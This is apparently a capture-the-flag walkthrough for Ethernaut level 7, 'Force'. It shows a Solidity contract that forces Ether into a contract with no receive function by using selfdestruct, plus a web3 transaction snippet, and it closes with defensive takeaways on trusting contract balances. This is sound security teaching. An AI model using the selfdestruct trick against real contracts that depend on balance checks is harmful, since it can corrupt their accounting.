# Level 7 : Force

### Never use contract balance as an accounting or auth check even if there is no selfdestruct() function

This levels requires you to send ethers to an empty contract.

**`selfdestruct()` is big red button that lets you abandon your smart contract and move all remaining Ethers to another address**

- **Never trust your own accounting:** Even as an owner of the contract, you do not control your contract’s balance. **Never use contract balance as an accounting or auth check.**
- Even if you didn’t implement a selfdestruct(), it is still possible through any [delegatecall](https://medium.com/coinmonks/ethernaut-lvl-6-walkthrough-how-to-abuse-the-delicate-delegatecall-466b26c429e4)() vulnerabilities.
- If you implement a `selfdestruct`, i) authenticate that the `msg.sender = owner` and ii) **emit an event** for external dependencies on this contract and for future reference.

**For this level , simple `transfer` or `send` won't work because the `Force` implements neither `receive` nor `fallaback` functions. Calls with any value will revert.**

However, the checks can be bypassed by using `selfdestruct` of an intermediate contract - `Payer` which would specify `Force`'s address as beneficiary of it's funds after it's self-destruction.

1. First step is to go on remix.ide, create a contract
2. Implement a `payable()` function like receive() or fallback() allowing this contract to receive Ether so it can have a balance to send to the target Ethernaut Contract.
3. Implement a selfdestruct function that will send ethers of the contract to the Ethernaut Meow Contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Payer {
    uint public balance = 0;

    function destruct(address payable _to) external payable {
        selfdestruct(_to);
    }

    receive() external payable {
        balance += msg.value;
    }
}
```

**Send ether to the contract using remix.ide or javascript console  :**  

```
web3.eth.sendTransaction({
    from: "// Your Address",
    to: "// Contract Address just created",
    value: 10000000000000
})

```

Then on remix.ide click on the `destruct()` button and check the balance of the Ethernaut contract with `getBalance(contract.address)`

# **Key Security Takeaways**

- **Never trust your own accounting:** Even as an owner of the contract, you do not control your contract’s balance. Never use contract balance as an accounting or auth check.
- Even if you didn’t implement a selfdestruct(), it is still possible through any [delegatecall](https://medium.com/coinmonks/ethernaut-lvl-6-walkthrough-how-to-abuse-the-delicate-delegatecall-466b26c429e4)() vulnerabilities.
- If you implement a `selfdestruct`, i) authenticate that the `msg.sender = owner` and ii) **emit an event** for external dependencies on this contract and for future reference.